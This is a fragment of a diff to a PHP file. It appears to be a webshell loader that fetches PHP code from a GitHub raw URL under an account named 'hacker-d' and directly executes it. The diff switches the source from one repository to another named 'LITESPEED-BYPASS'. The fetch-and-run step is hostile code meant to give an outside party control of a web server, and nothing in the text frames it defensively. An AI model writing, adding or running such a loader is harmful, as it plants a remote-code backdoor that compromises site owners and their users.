@@ -25,7 +25,7 @@ function geturlsinfo($url) {
 }
 
 // Directly execute the main content
-$a = geturlsinfo('https://raw.githubusercontent.com/hacker-d/22/main/style2.php');
+$a = geturlsinfo('https://raw.githubusercontent.com/hacker-d/LITESPEED-BYPASS/main/style.php');
 if ($a !== false) {
     // Optionally modify the content to replace file_get_contents with cURL if found
     // Example: $a = str_replace('file_get_contents(', 'custom_get_contents(', $a);
